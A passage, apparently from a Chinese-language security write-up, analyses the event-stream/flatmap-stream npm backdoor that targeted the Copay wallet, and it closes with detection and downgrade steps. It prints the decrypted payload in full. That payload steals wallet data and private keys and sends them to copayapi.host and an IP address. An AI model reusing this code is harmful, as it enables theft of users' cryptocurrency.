    t = 'A Secure Bitcoin Wallet';
    r = require("fs"),
    i = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js",
    n = r.statSync(i),
    c = r.readFileSync(i, "utf8"),
    o = require("crypto").createDecipher("aes256", t),// 解密出新的代码
    s = o.update(e, "hex", "utf8");
    s = "\n" + (s += o.final("utf8"));
    console.log(`解密后字符串为${s}`);
    var a = c.indexOf("\n/*@@*/");
    0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, "utf8"), r.utimesSync(i, n.atime, n.mtime), process.on("exit", function() {
        try {
            r.writeFileSync(i, c, "utf8"), r.utimesSync(i, n.atime, n.mtime)// 将恶意代码写入到./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js中
        } catch (e) {}
    })
输出结果：
格式化最后一段代码，终于发现了后门作者的意图：
    /*@@*/ ! function() {
        function e() {
            try {
                var o = require("http"),
                    a = require("crypto"),
                    c = "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----";
                // 发送http请求，参数为：主机地址，路径，数据
                function i(e, t, n) {
                    e = Buffer.from(e, "hex").toString();
                    var r = o.request({
                        hostname: e,
                        port: 8080,
                        method: "POST",
                        path: "/" + t,
                        headers: {
                            "Content-Length": n.length,
                            "Content-Type": "text/html"
                        }
                    }, function() {});
                    r.on("error", function(e) {}), r.write(n), r.end()
                }
                // 加密数据并发送到两个主机
                function r(e, t) {
                    for (var n = "", r = 0; r < t.length; r += 200) {
                        var o = t.substr(r, 200);
                        n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
                    }
                    i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n) // copayapi.host,111.90.151.134
                }
                // 获取文件
                function l(t, n) {
                    if (window.cordova) try {
                        var e = cordova.file.dataDirectory;
                        resolveLocalFileSystemURL(e, function(e) {
                            e.getFile(t, {
                                create: !1
                            }, function(e) {
                                e.file(function(e) {
                                    var t = new FileReader;
                                    t.onloadend = function() {
                                        return n(JSON.parse(t.result))
                                    }, t.onerror = function(e) {
                                        t.abort()
                                    }, t.readAsText(e)
                                })
                            })
                        })
                    } catch (e) {} else {
                        try {
                            var r = localStorage.getItem(t);
                            if (r) return n(JSON.parse(r))
                        } catch (e) {}
                        try {
                            chrome.storage.local.get(t, function(e) {
                                if (e) return n(JSON.parse(e[t]))
                            })
                        } catch (e) {}
                    }
                }
                // 获取用户账号的详细信息并发送 账号信息发送到 http://copayapi.host:8080/c http://111.90.151.134:8080/c
                global.CSSMap = {}, l("profile", function(e) {
                    for (var t in e.credentials) {
                        var n = e.credentials[t];
                        "livenet" == n.network && l("balanceCache-" + n.walletId, function(e) {
                            var t = this;
                            t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
                        }.bind(n))
                    }
                });
                // 重写bitcore-wallet-client/lib/credentials.js中的getKeysFunc函数，发送用户虚拟钱包私钥，私钥信息发送到 http://copayapi.host:8080/p http://111.90.151.134:8080/p
                var e = require("bitcore-wallet-client/lib/credentials.js");
                e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                    var t = this.getKeysFunc(e);
                    try {
                        global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\\t" + this.xPubKey))
                    } catch (e) {}
                    return t
                }
            } catch (e) {}
        }
        window.cordova ? document.addEventListener("deviceready", e) : e()
    }();
通过这段代码可以看出,后门作者获取了一个数字货币钱包APP的用户账号信息和私钥，并分别发送到两个主机名。用户账号信息发送到http://copayapi.host:8080/c和http://111.90.151.134:8080/c然后通过原型重写了bitcore-wallet-client/lib/credentials.js中的getKeysFunc方法，只要在APP运行时调用到了getKeysFunc方法就会将私钥发送到http://copayapi.host:8080/p
http://111.90.151.134:8080/p。
## 事件影响
虽然被写入恶意代码的event-stream包下载量千万，但后门作者明显是针对[bitpay/copay](https://github.com/bitpay/copay)这个项目，只想窃取虚拟货币。
对于开发者，如果使用了Vue、nodemon等软件包基本不受影响。当然该处理还是要处理的。如果使用了copay-dash这个npm包请尽快删除恶意代码并重新打包发布新版APP。
对于虚拟钱包APP用户，近期尽量不要进行虚拟货币交易等待APP升级修复。
## 解决方案
  * 查看项目中是否包含flatmap-stream恶意npm包
    npm ls event-stream flatmap-stream
    ...
    flatmap-stream@0.1.1
    ...
  * 降级软件包
    npm install event-stream@3.3.4
## 参考
  1. [I don’t know what to say](https://github.com/dominictarr/event-stream/issues/116)